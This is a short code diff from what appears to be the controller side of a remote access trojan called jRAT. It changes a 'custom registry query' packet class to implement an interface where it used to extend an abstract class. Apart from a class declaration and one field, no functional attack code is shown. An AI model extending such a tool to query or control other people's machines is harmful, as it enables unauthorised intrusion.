@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet80CustomRegQuery extends AbstractOutgoingPacket {
+public class Packet80CustomRegQuery implements OutgoingPacket {
 
 	private String query;
 
